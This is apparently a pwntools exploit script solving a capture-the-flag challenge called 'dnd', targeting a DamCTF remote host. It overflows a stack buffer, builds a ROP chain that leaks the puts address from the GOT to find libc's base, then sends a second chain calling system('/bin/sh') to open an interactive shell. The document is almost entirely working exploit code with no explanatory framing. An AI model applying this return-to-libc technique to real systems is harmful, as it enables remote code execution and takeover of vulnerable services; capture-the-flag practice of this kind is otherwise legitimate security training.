from pwn import *

# Set up logging
context.log_level = 'info'
context.arch = 'amd64'
binary = './dnd'
elf = ELF(binary)

# Choose local or remote
LOCAL = False
if LOCAL:
    libc = ELF('./libc.so.6')
else:
    libc = ELF('./libc.so.6')

# Gadgets
POP_RDI = 0x402640  # pop rdi ; nop ; pop rbp ; ret
RET = 0x40201a      # ret gadget

def exploit():
    if LOCAL:
        p = process(binary)
    else:
        p = remote('dnd.chals.damctf.xyz', 30813)
    
    # Send "a" repeatedly until we get to the win function
    log.info("Sending attacks to reach win function")
    
    # Try a different approach - send multiple 'a's at once
    p.sendafter(b"#####", b"a\na\na\na\na\n")
    
    # Look for the name prompt
    data = p.recvuntil(b"What is your name, fierce warrior?", timeout=2)
    if b"What is your name" not in data:
        p.close()
        return exploit()
    
    log.success("Reached the win function!")
    
    # First stage: Leak libc address
    padding = b"A" * 0x68  # 0x60 bytes to saved rbp + 8 bytes for saved rbp
    
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    win_addr = 0x40286d
    
    # First payload: leak puts address and return to win
    payload1 = padding + p64(POP_RDI) + p64(puts_got) + p64(0xdeadbeef) + p64(puts_plt) + p64(win_addr)
    
    # Send the payload with clear separation
    p.sendline(payload1)
    
    # Let's capture everything for debugging
    p.recvuntil(b"We will remember you forever, ", timeout=2)
    p.recvline()  # Skip the name echo
    
    try:
        leak = p.recvline(timeout=2).strip()
        puts_leak = u64(leak.ljust(8, b"\x00"))
        log.info(f"Leaked puts address: {hex(puts_leak)}")
    except Exception as e:
        log.error(f"Failed to parse leak: {e}")
        p.interactive()
    
    # Calculate libc base
    libc.address = puts_leak - libc.sym['puts']
    log.info(f"Libc base: {hex(libc.address)}")

    # Second stage: get shell
    p.recvuntil(b"What is your name, fierce warrior?", timeout=2)
    
    # Craft ROP chain for system("/bin/sh")
    system_addr = libc.sym['system']
    bin_sh = next(libc.search(b'/bin/sh'))
    
    # Add an extra ret for stack alignment
    payload2 = padding + p64(RET) + p64(POP_RDI) + p64(bin_sh) + p64(0xdeadbeef) + p64(system_addr)
    
    p.sendline(payload2)
    p.interactive()

if __name__ == "__main__":
    while True:
        try:
            exploit()
            break
        except Exception as e:
            log.error(f"Exploit failed: {e}")
            continue
